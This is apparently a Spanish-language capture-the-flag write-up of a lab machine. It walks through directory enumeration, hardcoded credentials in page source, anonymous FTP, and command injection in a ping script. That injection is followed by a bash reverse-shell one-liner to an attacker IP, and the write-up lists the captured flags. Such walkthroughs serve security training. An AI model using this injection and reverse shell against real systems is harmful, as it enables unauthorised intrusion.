-  Vamos a ver el puerto 80 que contiene esta pagina web

![[Pasted image 20240802214740.png]]

- Se hace una enumeracion de directorio usando la herramienta **dirb** y nos da como resultado que hay un directorio llamado **uploads** 

![[Pasted image 20240803005503.png]]

- Al ingresar a ese directorio obtenemos otra flag

![[Pasted image 20240803005600.png]]

```
FLAG{ENUMERA_DIRECTORIOS_SIEMPRE}
``` 

* Al revisar el codigo fuente de esa pagina se obtiene una flag

![[Pasted image 20240802215052.png]]

```
<!-- FLAG{B13N_Y4_T13N3S_UN4_+} -->
``` 

* Se revisa el **Bypass Login 1** y en su codigo fuente hay unas credenciales fijas que son **supersecret** y **admin**

![[Pasted image 20240802215804.png]]

* Al loguearse con esas credenciales se obtiene otra flag

![[Pasted image 20240802220251.png]]

```
FLAG{LOGIN_Y_JAVASCRIPT}
``` 

- En el link de Ping-Pong nos muestra esto

![[Pasted image 20240802230923.png]]

- Si ejecutamos en la url ese archivo php con esa variable ip, obtenemos con exito un ping

![[Pasted image 20240802231430.png]]

* Esto me da a entender que es vulnerable a command injection por lo tanto al probar con el caracter **|** si se explota con exito la vulnerabilidad

![[Pasted image 20240802231606.png]]

* Al revisar ese archivo **txt** se obtiene otra flag

![[Pasted image 20240802231945.png]]

```
FLAG{SIMPLEMENTE_RCE}
``` 

- Luego se ejecuto un reverse shell de la siguiente manera

```
bash -c 'bash -i >& /dev/tcp/192.168.1.7/443 0>&1'
``` 

- Para que funcione se tiene que usar URL encoding y con ayuda de BurpSuite se realizo el encoding

![[Pasted image 20240803001126.png]]

- El resultado del URL enconding se pega en la URL despues del caracter **|** y con eso se obtuvo una reverse shell exitosamente

![[Pasted image 20240803001516.png]]

![[Pasted image 20240803001611.png]]

- Nos dirijimos a la carpeta **home** para ver que usuarios existen y solo hay uno llamado **deloitte**

![[Pasted image 20240803002326.png]]

- Dentro de ese usuario hay otra flag

![[Pasted image 20240803002409.png]]
![[Pasted image 20240803002431.png]]

```
FLAG{W311_D0N3_R00T_1S_W41T1nG_U}
``` 

- Dentro del usuario deloitte si se hace un **ls -la** se muestran diferentes archivos

![[Pasted image 20240803003317.png]]

- Dentro del archivo **.bash_history** hay diferentes ejecuciones que se hicieron y hay varias de esas ejecuciones interesantes que son estas

![[Pasted image 20240803003652.png]]
![[Pasted image 20240803003832.png]]

- Revisamos la flag de opt y esta encriptada en base64

![[Pasted image 20240803004110.png]]

- Desde nuestra maquina Kali Linux se desencripta y obtenemos otra flag

![[Pasted image 20240803004231.png]]

```
FLAG {Y0u_are a real Hacker}
``` 

- Dentro de la carpeta **html** estan todos los archivos y carpetas de la pagina web del puerto 80, al revisar la carpeta login_2 que es del Bypass Login 2 encontramos un archivo.php que contiene otra flag

![[Pasted image 20240803023113.png]]

```
FLAG{BYPASS1NG_HTTP_METH0DS_G00D!}
``` 

- El escaneo de nmap y el escaneo de directorio con dirb nos dice que el puerto 80 tiene un archivo **robots.txt** al revisar ese archivo no muestra lo siguiente

![[Pasted image 20240802234009.png]]

- Al ir a ese directorio de **/cyberacademy** se obtiene otra flag

![[Pasted image 20240802234149.png]]

```
FLAG{YEAH_R0B0T$.RUL3$}
``` 

- El resultado de nmap nos dice que el puerto 21 corre un FTP y a su vez nos dice que el inicio de sesión FTP anónimo está permitido con el usuario **ftp** o colocando el usuario **anonymous**, se obtiene el ingreso de manera exitosa y con el comando **dir** se listan los archivos

![[Pasted image 20240802235536.png]]

- Se descarga eso archivo **txt** con el comando **get** y al revisar su contenido se obtiene otra flag

![[Pasted image 20240802235807.png]]

![[Pasted image 20240803000010.png]]

```
FLAG{FTP_4n0nym0us_G00D_JoB!}
``` 


